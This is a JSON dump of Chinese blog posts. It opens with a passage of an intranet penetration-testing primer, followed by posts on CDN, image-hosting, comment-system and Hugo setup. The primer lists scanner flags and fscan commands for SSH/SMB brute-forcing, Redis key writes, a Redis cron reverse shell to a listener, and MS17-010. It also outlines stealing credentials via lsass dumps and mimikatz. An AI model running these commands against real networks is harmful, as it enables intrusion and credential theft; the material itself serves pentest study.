style=\"color:#75715e\"\u003e#半开放扫描。Nmap发送SYN包到远程主机，它不会产生任何会话.不需要通过完整的握手，就能获得远程主机的信息。因此不会在目标主机上产生任何日志记录，使用最频繁，安全，快\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-sT          \u003cspan style=\"color:#75715e\"\u003e#TCP connect扫描，需要完成三次握手，只适用于找出TCP和UDP端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-O           \u003cspan style=\"color:#75715e\"\u003e#检测操作系统、开放端口等等\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-sA          \u003cspan style=\"color:#75715e\"\u003e#用来穿过防火墙的规则集，检测哪些端口被屏蔽，速度慢。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-sV          \u003cspan style=\"color:#75715e\"\u003e#扫描端口开放的服务及版本           \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-v           \u003cspan style=\"color:#75715e\"\u003e#显示扫描的进程详细信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-Pn          \u003cspan style=\"color:#75715e\"\u003e#扫描之前不使用ping，适用于防火墙禁止ping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-A           \u003cspan style=\"color:#75715e\"\u003e#包含了-sV，-O，全面系统检测        \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-T           \u003cspan style=\"color:#75715e\"\u003e#0-5 扫描速度，5位最高\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-p           \u003cspan style=\"color:#75715e\"\u003e#指定扫描端口                                         \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-sP          \u003cspan style=\"color:#75715e\"\u003e#ping扫描（不进行端口扫描）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-sU          \u003cspan style=\"color:#75715e\"\u003e#UDP扫描,慢,可得到有价值的服务器程序\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-iL　        \u003cspan style=\"color:#75715e\"\u003e#扫描一个列表文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-oN          \u003cspan style=\"color:#75715e\"\u003e#输出结果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--open       \u003cspan style=\"color:#75715e\"\u003e#只显示开启的端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-F           \u003cspan style=\"color:#75715e\"\u003e#快速扫描，减少端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-sC          \u003cspan style=\"color:#75715e\"\u003e#根据端口识别的服务,调用默认脚本\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"2masscan\"\u003e2、\u003ca href=\"https://github.com/robertdavidgraham/masscan/releases\"\u003eMasscan\u003c/a\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-p \u0026lt;ports,--ports \u0026lt;ports\u0026gt;\u0026gt;                        \u003cspan style=\"color:#75715e\"\u003e#指定端口进行扫描\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--banners                                         \u003cspan style=\"color:#75715e\"\u003e#获取banner信息，支持少量的协议\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--rate \u0026lt;packets-per-second\u0026gt;                       \u003cspan style=\"color:#75715e\"\u003e#指定发包的速率\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-c \u0026lt;filename\u0026gt;, --conf \u0026lt;filename\u0026gt;                  \u003cspan style=\"color:#75715e\"\u003e#读取配置文件进行扫描\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--echo                                            \u003cspan style=\"color:#75715e\"\u003e#将当前的配置重定向到一个配置文件中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-e \u0026lt;ifname\u0026gt; , --adapter \u0026lt;ifname\u0026gt;                  \u003cspan style=\"color:#75715e\"\u003e#指定用来发包的网卡接口名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--adapter-ip \u0026lt;ip-address\u0026gt;                         \u003cspan style=\"color:#75715e\"\u003e#指定发包的IP地址\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--adapter-port \u0026lt;port\u0026gt;                             \u003cspan style=\"color:#75715e\"\u003e#指定发包的源端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--adapter-mac \u0026lt;mac-address\u0026gt;                       \u003cspan style=\"color:#75715e\"\u003e#指定发包的源MAC地址\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--router-mac \u0026lt;mac address\u0026gt;                        \u003cspan style=\"color:#75715e\"\u003e#指定网关的MAC地址\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--exclude \u0026lt;ip/range\u0026gt;                              \u003cspan style=\"color:#75715e\"\u003e#IP地址范围黑名单，防止masscan扫描\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--excludefile \u0026lt;filename\u0026gt;                          \u003cspan style=\"color:#75715e\"\u003e#指定IP地址范围黑名单文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--includefile，-iL \u0026lt;filename\u0026gt;                     \u003cspan style=\"color:#75715e\"\u003e#读取一个范围列表进行扫描\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--ping                                            \u003cspan style=\"color:#75715e\"\u003e#扫描应该包含ICMP回应请求\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--append-output                                   \u003cspan style=\"color:#75715e\"\u003e#以附加的形式输出到文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--iflist                                          \u003cspan style=\"color:#75715e\"\u003e#列出可用的网络接口，然后退出\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--retries                                         \u003cspan style=\"color:#75715e\"\u003e#发送重试的次数，以1秒为间隔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"3fscan\"\u003e3、\u003ca href=\"https://github.com/shadow1ng/fscan/releases\"\u003eFscan\u003c/a\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -np -no -nopoc\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e跳过存活检测 、不保存文件、跳过web poc扫描\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -rf id_rsa.pub \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eredis 写公钥\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eredis 计划任务反弹shell\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -c whoami \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003essh 爆破成功后，命令执行\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -m ssh -p \u003cspan style=\"color:#ae81ff\"\u003e2222\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e指定模块ssh和端口\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e加载指定文件的用户名、密码来进行爆破\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -o /tmp/1.txt \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e指定扫描结果保存路径,默认保存在当前路径\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/8  \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eA段的192.x.x.1和192.x.x.254,方便快速查看网段信息 \u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -m smb -pwd password \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esmb密码碰撞\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -h 192.168.1.1/24 -m ms17010 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e指定模块\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efscan.exe -hf ip.txt  \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e以文件导入\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"四内网凭证获取\"\u003e四、内网凭证获取\u003c/h3\u003e\n\u003ch4 id=\"1dpapi及它的两个api函数\"\u003e1、DPAPI及它的两个API函数\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。如果需要对某些数据进行加密或加密需要DPAPI提供的加密解密函数\u003c/li\u003e\n\u003cli\u003e对服务器密码（rdp凭证）的解密也需要用到Masterkey\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"2dpapi的作用范围\"\u003e2、DPAPI的作用范围\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eIE、Chrome的登录表单自动完成\u003c/li\u003e\n\u003cli\u003ePowershell加密函数\u003c/li\u003e\n\u003cli\u003eOutlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。\u003c/li\u003e\n\u003cli\u003eFTP管理账户密码\u003c/li\u003e\n\u003cli\u003e共享资源文件夹的访问密码\u003c/li\u003e\n\u003cli\u003e无线网络帐户密钥和密码\u003c/li\u003e\n\u003cli\u003e远程桌面身份凭证\u003c/li\u003e\n\u003cli\u003eEFS\u003c/li\u003e\n\u003cli\u003eEAP/TLS 和 802.1x的身份凭证\u003c/li\u003e\n\u003cli\u003eCredential Manager中的数据\u003c/li\u003e\n\u003cli\u003e以及各种调用了CryptProtectData函数加密数据的第三方应用，如Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk等。\u003c/li\u003e\n\u003cli\u003eetc\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"3master-keymaster-key-files\"\u003e3、Master Key/Master Key Files\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e存放密钥的文件则被称之为Master Key Files，其路径一般为：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e%APPDATA%/Microsoft/Protect/当前登录用户的SID\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e但是Master Key Files中存储的不是直接的密钥，而是将Master Key进行加密（随机64位字节码经过用户密码等信息）所存放的内容\u003c/li\u003e\n\u003cli\u003eMaster Key和Master Key Files之间的关系其实就是， Master Key经过用户密码等信息加密后的内容才变成了Master Key Files中存储的内容\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"4获取master-key\"\u003e4、获取Master Key\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e注入lsass进程，从内存中读取Master Key，也可以dump lsass进程离线读\u003c/li\u003e\n\u003cli\u003e从注册表中获取（HKLM\\SYSTEM、HKLM\\SECURITY）\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"5windows-rdp凭证获取\"\u003e5、Windows RDP凭证获取\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003emimikatz解密\u003c/strong\u003e\u003c/p\u003e","title":"安全内网渗透技术基础"},{"content":"一、序章 之前通过PicGo + GitHub 搭建的图床，这样搭建的图床很稳定，但缺点是国内访问速度慢。我们可以通过 Cloudflare 和 jsDelivr 免费加速博客 GitHub 图床等静态资源，自动实现 CDN 资源的国内外分流，加速博客访问速度。\njsDelivr是什么？ jsDelivr是国外的一家优秀的公共 CDN 服务提供商，该平台是首个「打通中国大陆与海外的免费 CDN 服务」，无须担心中国防火墙问题而影响使用。官网：http://www.jsdelivr.com/(opens new window)\n思路 对于 Github 公开仓库中的静态资源，有以下两种不同的访问方式。\n如果访问来源是国内，则使用 Chinajsdelivr 进行加速，域名为jsd.cdn.zzko.cn 如果访问来源是国外，则使用原版 jsDelivr 进行加速，域名为cdn.jsDelivr.net 也就是，希望对于同一个资源链接，能够根据国内外的请求来源自动重定向，使用不同的 CDN 加速链接，这就可以使用 Cloudflare 的重定向规则。\n二、配置Cloud Flare 1、使用 Cloudflare 托管域名 1.1 添加站点 使用Cloudflare添加自己的域名站点。\n输入域名继续 选择免费计划，并继续\n将 Cloudflare 分配的解析服务器添加的到域名注册机构网站的DNS解析记录里。\n以spaceship为例，在dns管理里面添加Cloudflare分配的地址。 在Cloudflare里添加一条CNAME博客的dns解析记录。\n2、配置dns解析记录 在 DNS 配置中，新增一条 CNAME 解析记录，并启用代理。 将 cdn.hamor.top 解析到了 jsd.cdn.zzko.cn，并使用 Cloudflare 代理，并点亮小云朵。\n3、配置重定向规则 资源链接都使用 cdn.hamor.top，Cloudflare 在代理 cdn.hamor.top 时，判断请求来源是国内，则将 cdn.hamor.top 重定向到 jsd.cdn.zzko.cn；国外的请求则重定向到 cdn.jsdelivr.net。\n3.1 配置国内重定向规则 规则名称 （必需）：国内，方便区分 自定义筛选表达式：(http.host eq \u0026quot;cdn.haoyep.com\u0026quot; and ip.geoip.country eq \u0026quot;CN\u0026quot;) URL 重定向 类型：动态 表达式：concat(\u0026quot;https://jsd.cdn.zzko.cn\u0026quot;, http.request.uri.path) 状态代码：302 按以下方式进行配置即可。\n3.2 配置国外重定向规则 规则名称 （必需）：国外，方便区分 自定义筛选表达式：(http.host eq \u0026quot;cdn.haoyep.com\u0026quot; and ip.geoip.country ne \u0026quot;CN\u0026quot;) URL 重定向 类型：动态 表达式：concat(\u0026quot;https://cdn.jsdelivr.net\u0026quot;, http.request.uri.path) 状态代码：302 按以下方式进行配置即可。\n4、注意事项 HTTP 重定向状态选择302而不是301。虽然两类请求都会被 Cloudflare 缓存，但301理论上是永久跳转而302是临时跳转，因此301可能会导致长时间缓存，不利于今后修改重定向到新地址。\n三、PicGo设置 想让上传的图片自动生成 CDN 链接，还需要对PicGo进行配置，可以参考下图进行配置。\n1、设定存储路径：可以不填，这里填写一个文件夹名称方便管理 2、自定义域名： 改为https://\u0026lt;cdn加速链接\u0026gt;/gh/\u0026lt;用户名\u0026gt;/\u0026lt;图床仓库名\u0026gt;，参考我的 https://cdn.hamor.top/gh/h4m0r/Blog_img 进行修改即可。\n四、参考文章 通过Cloudflare和jsDelivr免费加速博客 GitHub 图床等静态资源\n","permalink":"https://hamor.top/posts/blog/%E5%88%A9%E7%94%A8cloudflare%E5%92%8Cjsdelivr%E5%85%8D%E8%B4%B9%E5%8A%A0%E9%80%9Fgithub%E5%9B%BE%E5%BA%8A%E7%AD%89%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/","summary":"\u003ch2 id=\"一序章\"\u003e一、序章\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e之前通过PicGo + GitHub 搭建的图床，这样搭建的图床很稳定，但缺点是国内访问速度慢。我们可以通过 Cloudflare 和 jsDelivr 免费加速博客 GitHub 图床等静态资源，自动实现 CDN 资源的国内外分流，加速博客访问速度。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003ejsDelivr是什么？\n\u003ccode\u003ejsDelivr\u003c/code\u003e是国外的一家优秀的公共 CDN 服务提供商，该平台是首个「打通中国大陆与海外的免费 CDN 服务」，无须担心中国防火墙问题而影响使用。官网：\u003ca href=\"http://www.jsdelivr.com/\"\u003ehttp://www.jsdelivr.com/(opens new window)\u003c/a\u003e\u003c/p\u003e","title":"利用CloudFlare和jsDelivr免费加速GitHub图床等静态资源"},{"content":"一、创建图床仓库 1、创建仓库 登陆 github ，创建一个公开仓库作为图片存储库。\n2、获取个人 token 此时，需要生成一个token用于PicGo访问图床仓库，访问：settings-tokens ，点击Generate new token。然后设置 token 属性，Expiration：no expiration，Select scopes：repo 全选即可。\n3、保存token token 生成后只会显示一次，请复制、保存到其他地方以备后续使用。\n二、安装PicGo 可以到 Github 发布页面下载 PicGo 最新安装包。\n1、配置图床 设置PicGo，仓库名的格式是用户名/仓库，一般选择 main 分支，token 是上文中获取的。\n存储路径：可以选择让图片单独放在仓库的文件夹中 自定义域名：后面文章再谈使用CDN加速图床，这里可以先空着。 2、PicGo 设置 如果在粘贴图片时上传失败，可以尝试把内置剪贴板上传功能关闭或开启。\n三、安装Obsidian 去Obsidian 官网下载，并进行安装。\n1、安装插件 点击Obsidian——Preferences——第三方插件——关闭安全模式——社区插件市场。\n然后搜索安装以下插件。\n2、配置插件 按以下设置进行配置即可，开启剪贴板自动上传，接口是一一对应的。默认就好，不用修改。\n3、使用 在用写obsidian写文章的时候，往obsidian里吗粘贴图片，就会自动上传到GitHub的图片仓库了。\n","permalink":"https://hamor.top/posts/blog/%E4%BD%BF%E7%94%A8picgo+github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A/","summary":"\u003ch2 id=\"一创建图床仓库\"\u003e一、创建图床仓库\u003c/h2\u003e\n\u003ch4 id=\"1创建仓库\"\u003e1、创建仓库\u003c/h4\u003e\n\u003cp\u003e登陆 \u003ca href=\"https://github.com/\"\u003egithub\u003c/a\u003e ，创建一个\u003cstrong\u003e公开\u003c/strong\u003e仓库作为图片存储库。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://cdn.hamor.top/gh/h4m0r/Blog_img/cdnimg/20240422150331.png\" alt=\"image.png\"  /\u003e\n\u003c/p\u003e\n\u003ch4 id=\"2获取个人-token\"\u003e2、获取个人 token\u003c/h4\u003e\n\u003cp\u003e此时，需要生成一个token用于PicGo访问图床仓库，访问：\u003ca href=\"https://github.com/settings/tokens\"\u003esettings-tokens\u003c/a\u003e ，点击\u003cstrong\u003eGenerate new token\u003c/strong\u003e。然后设置 token 属性，Expiration：\u003ccode\u003eno expiration\u003c/code\u003e，Select scopes：\u003ccode\u003erepo\u003c/code\u003e 全选即可。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://cdn.hamor.top/gh/h4m0r/Blog_img/cdnimg/20240422150621.png\" alt=\"image.png\"  /\u003e\n\u003c/p\u003e\n\u003ch4 id=\"3保存token\"\u003e3、保存token\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003etoken 生成后只会显示一次，请复制、保存到其他地方以备后续使用。\u003c/p\u003e","title":"使用PicGo+GitHub搭建博客图床"},{"content":" 参考Twikoo官方文档，添加Hugo博客的评论系统\n一、申请env ID 查看官方文档Twikoo文档 ，采用云函数Vercel 部署方式，可参考Vercel 部署视频教程但其中有一个需要注意的点在bitbucket设置这里。\n1. 申请 MongoDB 账号 可以直接使用google账号授权进行登录，这样比较方便。 2、创建数据库 选择aws服务商，创建免费 MongoDB 数据库，区域选择 AWS / N. Virginia (us-east-1) 3、创建数据库账号密码 创建数据库用户，username随便写，密码可以Autogenerate Secure Password随机生成密码，并记录好密码，最后点击 Create User创建账号。\n4、放通IP地址访问 在 Network Access 页面点击 Add IP Address，Access List Entry 输入 0.0.0.0/0（允许所有 IP 地址的连接），点击 Confirm。 5、获取链接方式 在 Database 页面点击 Connect，连接方式选择 Drivers，并记录数据库连接字符串，请将连接字符串中的 \u0026lt;username\u0026gt;:\u0026lt;password\u0026gt; 修改为刚刚创建的数据库 用户名:密码 mongodb+srv://twikoo:\u0026lt;password\u0026gt;@cluster0.fyyvm4b.mongodb.net/?retryWrites=true\u0026amp;w=majority\u0026amp;appName=Cluster0 二、申请 Vercel 账号 1、注册账号 2、部署到Vercel 击以下面链接将 Twikoo 一键部署到 Vercel。 deploy\n3、绑定bitbucket 3.1 这里点击bitbuket可以用只用google账号进行绑定。\n3.2 登录到bitbuket，创建一个空间，然后创建一个库，不然下面获取不到bitbucket到库。\n3.3 绑定bitbucket 创建完空间和库之后，再回到vercel deploy，就可以绑定到bitbucket中的库了，点击创建。创建完成后，下面有一览信息需要填写，这里随意填就可以了，然后填完就自动开始部署，耐心等待完成即可。\n4、添加环境变量 进入 Settings - Environment Variables，添加环境变量 MONGODB_URI，值为前面记录的数据库连接字符串 回到Deployments设置，点击redeploy，然后勾选Redeploy with existing Build Cache.，点击REDEPLOY，耐心等待STATUS，building完成。 回到Project，复制DAMIN下面的地址。\n打开进行测试，显示如下信息表示运行正常。\n三、配置到博客 1、配置twikoo到博客 1.1 version版本这里到twikoo GitHub上查询最新的版本好填上即可。 1.2 id填写自己的twikoo id。\ntwikoo: version: 1.6.32 # 填写twikoo版本号 id: https://twikoo-api-black.vercel.app/ # 填写自己的twikoo id region: # 环境地域，默认为 ap-shanghai，如果您的环境地域不是上海，需传此参数，请看twikoo官方文档,Vercel 环境不填 2、设置评论密码管理 配置好twikoo后，重新hugo server -D，到下面所示的地方设置评论管理密码。\n3、设置邮件提醒 twikoo使用比较方便，邮件提醒只需要在评论里设置就可以了。至此，评论功能全部部署完成。\n","permalink":"https://hamor.top/posts/blog/hugo%E5%8D%9A%E5%AE%A2%E5%A2%9E%E5%8A%A0twikoo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考Twikoo官方文档，添加Hugo博客的评论系统\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"一申请env-id\"\u003e一、申请env ID\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e查看官方文档\u003ca href=\"https://twikoo.js.org/quick-start.html\"\u003eTwikoo文档\u003c/a\u003e ，采用云函数\u003ca href=\"https://twikoo.js.org/backend.html#vercel-%E9%83%A8%E7%BD%B2\"\u003eVercel 部署\u003c/a\u003e方式，可参考\u003ca href=\"https://www.bilibili.com/video/BV1Fh411e7ZH/?vd_source=15429ce160c094e4dbbce2cce6d4e14c\"\u003eVercel 部署视频教程\u003c/a\u003e但其中有一个需要注意的点在bitbucket设置这里。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://cdn.hamor.top/gh/h4m0r/Blog_img/cdnimg/20240415200323.png\" alt=\"image.png\"  /\u003e\n\u003c/p\u003e\n\u003ch4 id=\"1-申请mongodb账号\"\u003e1. 申请 \u003ca href=\"https://www.mongodb.com/cloud/atlas/register\"\u003eMongoDB\u003c/a\u003e 账号\u003c/h4\u003e\n\u003cp\u003e可以直接使用google账号授权进行登录，这样比较方便。\n\u003cimg loading=\"lazy\" src=\"https://cdn.hamor.top/gh/h4m0r/Blog_img/cdnimg/20240415215724.png\" alt=\"image.png\"  /\u003e\n\u003c/p\u003e\n\u003ch4 id=\"2创建数据库\"\u003e2、创建数据库\u003c/h4\u003e\n\u003cp\u003e选择aws服务商，创建免费 MongoDB 数据库，区域选择 \u003ccode\u003eAWS / N. Virginia (us-east-1)\u003c/code\u003e\n\u003cimg loading=\"lazy\" src=\"https://cdn.hamor.top/gh/h4m0r/Blog_img/cdnimg/20240416114414.png\" alt=\"image.png\"  /\u003e\n\u003c/p\u003e","title":"Hugo博客增加Twikoo评论系统"},{"content":"序章 一直想用博客的形式记录自己的生活、工作、学习的点滴，从2018年开始用Hexo+NEXT写博客上传到GitHub，后来又断断续续的写了一段时间就荒废了。从今年4月开始看着朋友的博客写的有声有色，除了想用博客来记录之外，觉得自己还是需要将所学的东西沉淀下来，有一个回顾的平台，希望博客能为可能遇到同样问题网友提供帮助。\n在准备搭建博客之初，想过很多的方案，想过购买云主机、CloudFlare Works、Github Page等方案，最后综合考虑博客是一个自己记录滴滴地方，个人觉得发布到GitHub比较省心，选择了用Github Page来承载博客，方案采用Hugo来生成静态博客，因为Hugo实在太省心了，不会向Hexo方案那样因为node.js导致的各种错误头大，主题采用简约风格的PaperMod。\n一、概念及思路 1、什么是GitHub Pages GitHub Pages 是一项静态站点托管服务，只能托管静态站点，不能运行服务器端源码，比如 PHP、Java、Python等。它可以直接从 GitHub 上的仓库获取 HTML、CSS 和 JavaScript 文件，通过构建过程运行文件，然后发布网站。\n2、什么是Hugo Hugo是由Go语言实现的静态网站生成器，可以把 Markdown 文件转化成 HTML 文件，简单、易用、高效、易扩展、快速部署。\n3、博客搭建思路 3.1 需要创建 3个 GitHub 仓库 这里先建好3个仓库，方便后面将博客内容推送到GitHub\n博客源仓库：储存所有 Markdown 源文件（博客内容），和博客中用到的图片等。 GitHub Pages 仓库：储存由 Hugo 从Markdown 文件生成的 HTML 文件。 图片仓库：用来存储博客正文中所用到的图片，下一篇搭建图床的文章将介绍。 3.2 推送到GitHub pages 将在博客源仓库中 Hugo 生成的静态 HTML文件推送到远端 GitHub Pages仓库中。\n二、创建GitHub仓库 1、创建博客源文件仓库 仓库名可以随意取 勾选 Pricate，设置为私有仓库，这样设置能很好的保护自己的源码文件。 勾选添加 README 文件。 2、创建 GitHub Page 仓库 这个仓库必须使用特殊的命名格式 \u0026lt;username.github.io\u0026gt;， \u0026lt;username\u0026gt; 是自己的 GitHub 的用户名。 勾选 Public，设置为公开仓库。 勾选添加 README 文件。 三、克隆博客源仓库到本地 之前从安装hugo，到配置主题papermod，发布测试文章到GitHub，流程全部走通了，只是部分功能需要自己去配置。后来发现已经有很多大佬公开了他们的博客文件，就直接去git clone下来部署，后续再根据自己的需要进行调整，这样会节省很多时间，少踩很多坑。\n1、克隆已经开源的博客到本地 1.1 这里我选择的是Sulv题主的开源博客进行部署，打开想要在本地储存项目的文件夹（比如我的项目的文件夹是 Project ）\ncd Project 1.2 克隆博客仓库到项目文件夹，克隆时使用的 HTTPS 仓库链接\ngit clone git@github.com:xyming108/sulv-hugo-papermod.git # 